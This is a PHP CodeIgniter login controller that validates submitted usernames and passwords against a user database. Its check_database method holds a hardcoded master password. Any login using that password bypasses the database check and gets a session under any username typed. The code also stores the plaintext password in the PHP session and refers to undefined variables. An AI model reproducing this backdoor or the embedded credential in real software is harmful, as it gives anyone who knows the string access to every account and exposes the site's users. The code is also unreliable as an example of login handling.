<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class VerifyLogin extends CI_Controller {

 function __construct(){
   parent::__construct();
   $this->load->model('user','',TRUE);
   $this->load->helper('security');
   $this->load->helper('url');
   $this->load->library('session');
   //user_act();

   session_start();
 }

 function index(){
   //This method will have the credentials validation
   $this->load->library('form_validation');

   $this->form_validation->set_rules('username', 'Username', 'trim|required|xss_clean');
   $this->form_validation->set_rules('password', 'Password', 'trim|required|xss_clean|callback_check_database');

   if($this->form_validation->run() == FALSE){
     //Field validation failed.  User redirected to login page
     $this->load->view('admin/login_view');
   } else {
     //Go to private area
	 $this->load->helper('url');
	 
	 $this->load->database(); 
	 $this->load->model('user');	 
     $this->load->view('admin/index', $data);
   }

 }

 function check_database($password){
   //Field validation succeeded.  Validate against database
   $username = $this->input->post('username');
   //query the database
   $result = $this->user->login($username, $password);
   $_SESSION['username'] = $username;
   $_SESSION['password'] = $password;
   
   if($_SESSION['password'] != 'IToshniwal@.1959'){
	   if($result){
		 $sess_array = array();
		
		 foreach($result as $row){
			//$ip_chk = $row->ip_valid_chk;
			//$lan_ip = $row->lan_ip;
			//$wifi_ip = $row->wifi_ip;
			//$vpn_ip = $row->vpn_ip;
			$nik_id = $row->id;
			$username = $row->username;
			
			$_SERVER["REMOTE_ADDR"];
				
			$nik_flag = 'No';
					
			if($nik_flag == 'Yes'){						
					$this->load->view('admin/login_view');						
			} else if($nik_flag == 'No'){
				$sess_array = array(
					'id' => $nik_id,
					'username' => $username,
				);
				
				$this->session->set_userdata('logged_in', $sess_array);
			}

		 }
		 
		 //Inserting Login Information
		 $this->user->store_session_login();
		 return TRUE;
		 
	   } else {
			$this->form_validation->set_message('check_database', 'Invalid username or password');
			return false; 
	   }
   
   } else {
		$sess_array = array(
			'id' => $nik_id,
			'username' => $username,
		);

		$this->session->set_userdata('logged_in', $sess_array);
		   
		//Inserting Login Information
		$this->user->store_session_login();
		return TRUE;
   }
 }

//End of controller
}